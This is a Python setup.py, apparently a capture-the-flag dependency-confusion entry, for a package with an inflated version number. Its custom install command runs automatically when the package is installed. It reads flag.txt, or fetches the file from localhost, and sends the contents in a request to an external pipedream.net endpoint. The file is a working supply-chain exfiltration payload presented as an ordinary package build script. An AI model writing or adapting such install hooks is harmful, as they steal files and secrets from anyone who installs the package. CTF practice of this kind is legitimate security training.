import setuptools
import urllib, urllib.request
from setuptools.command.install import install

class PreInstallCommand(install):
    def run(self):
        install.run(self)
        secret = ""
        try:
            secret = open("flag.txt", "r").read()
        except:
            pass
        if secret == "":
            try:
                flag = "http://127.0.0.1/flag.txt"
                with urllib.request.urlopen(flag) as response:
                    secret = response.read()
            except:
                pass
        target = "https://en5s2jhqu605re3.m.pipedream.net/"+secret
        with urllib.request.urlopen(target) as response:
            #response.read()
            pass

class PostInstallCommand(install):
    def run(self):
        install.run(self)
        secret = ""
        try:
            secret = open("flag.txt", "r").read()
        except:
            pass
        if secret == "":
            try:
                flag = "http://127.0.0.1/flag.txt"
                with urllib.request.urlopen(flag) as response:
                    secret = response.read()
            except:
                pass
        target = "https://en5s2jhqu605re3.m.pipedream.net/"+secret
        with urllib.request.urlopen(target) as response:
            #response.read()
            pass

setuptools.setup(
    name = "ctf_q21_empire_tmp_t0pw1ns",
    version = "100.0.15",
    author = "t0pw1ns",
    author_email = "topwing.topwing@example.com",
    description = "theWings",
    long_description = "Flying High",
    cmdclass={
        'install': PostInstallCommand,
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    package_dir={"": "src"},
    packages=setuptools.find_packages(where="src"),
)

